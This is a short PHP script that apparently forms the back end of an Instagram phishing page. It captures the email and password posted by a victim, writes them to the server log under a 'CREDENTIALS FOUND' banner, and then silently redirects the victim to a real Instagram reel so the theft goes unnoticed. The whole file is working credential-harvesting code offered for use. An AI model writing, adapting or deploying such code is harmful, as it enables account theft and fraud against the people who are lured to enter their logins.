<?php
$username = $_POST['Email'];
$password = $_POST['password'];
$res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password";
error_log("[+] Credentials Found!!!");
error_log("$res");
echo "<script type='text/javascript'>window.location='https://www.instagram.com/reel/ChDG2rIjIlV/?igshid=YmMyMTA2M2Y='</script>";
?>
